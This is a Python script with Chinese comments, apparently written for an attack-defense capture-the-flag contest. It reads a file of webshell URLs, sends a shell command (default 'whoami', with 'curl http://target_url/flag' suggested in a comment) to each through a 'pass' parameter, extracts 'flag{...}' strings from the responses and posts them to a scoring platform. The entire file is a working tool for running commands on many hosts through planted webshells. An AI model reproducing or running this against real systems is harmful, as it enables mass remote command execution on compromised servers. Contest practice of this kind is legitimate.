import requests
import re

# 从文本文件中读取Webshell URL
def read_webshell_urls_from_file(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f.readlines()]

# 用于批量提交flag的API地址和API密钥
flag_submit_url = "" #flag提交平台网址
api_key = "" #队伍ID，如果没用则留空

# 要执行的命令（例如：curl http://target_url/flag）
command = "whoami"

# 连接Webshell，执行命令并提交flag的函数
def exploit_and_submit(webshell_url):
    try:
        # 通过Webshell执行命令
        r = requests.get(webshell_url + "?pass=" + command, timeout=5)
        print(r)
        response_content = r.text

        # 提取并提交flag
        flag = extract_flag(response_content)
        if flag:
            submit_flag(flag)
        else:
            print(f"Flag not found for Webshell: {webshell_url}")
    except Exception as e:
        print(f"Error exploiting Webshell {webshell_url}: {e}")

# 从命令输出中提取flag的函数
def extract_flag(response_content):
    # 使用贪婪模式的正则表达式匹配flag
    flag_pattern = re.compile(r"flag\{.*\}")
    match = flag_pattern.search(response_content)
    if match:
        return match.group(0)
    else:
        return None

# 向比赛平台提交flag的函数
def submit_flag(flag):
    data = {
        "api_key": api_key,
        "flag": flag,
    }
    try:
        r = requests.post(flag_submit_url, data=data)
        if r.status_code == 200:
            print(f"Flag submitted successfully: {flag}")
        else:
            print(f"Error submitting flag: {r.content}")
    except Exception as e:
        print(f"Error submitting flag: {e}")

# 将Webshell URL列表从文本文件中读取
webshell_urls_file = "webshell_urls.txt"
webshell_urls = read_webshell_urls_from_file(webshell_urls_file)

# 遍历Webshell URL列表并执行命令
for webshell_url in webshell_urls:
    exploit_and_submit(webshell_url)

